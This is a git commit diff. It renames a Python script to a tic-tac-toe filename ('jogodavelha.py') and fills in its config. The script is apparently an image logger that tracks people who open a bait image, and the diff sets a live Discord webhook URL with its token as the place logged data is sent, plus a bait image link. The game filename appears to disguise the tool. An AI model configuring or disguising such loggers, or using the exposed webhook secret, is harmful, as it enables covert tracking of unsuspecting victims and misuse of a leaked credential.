2891f615a6ed30d1999a1a935e269852113bc08e
FourtyCoder <106442729+FourtyCoder@users.noreply.github.com>
2023-08-18 14:31:55 -0300

    atualizou o nome de "main.py" para jogodavelha.py

--- jogodavelha.py
+++ jogodavelha.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1142146599695429833/am9Fr2HBQWDon3DhTXqZUcrECALQWbOOjOBK8XOLz6AKQSv7WbAXGY7GG3qJ4Nttsn6I",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWwx8ymUJLs97AkHgGfDYXtXTj5d2uXrBTiVrA2GiwNoWYV6KE3tbyFHMFUpCwgaboiGg&usqp=CAU", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
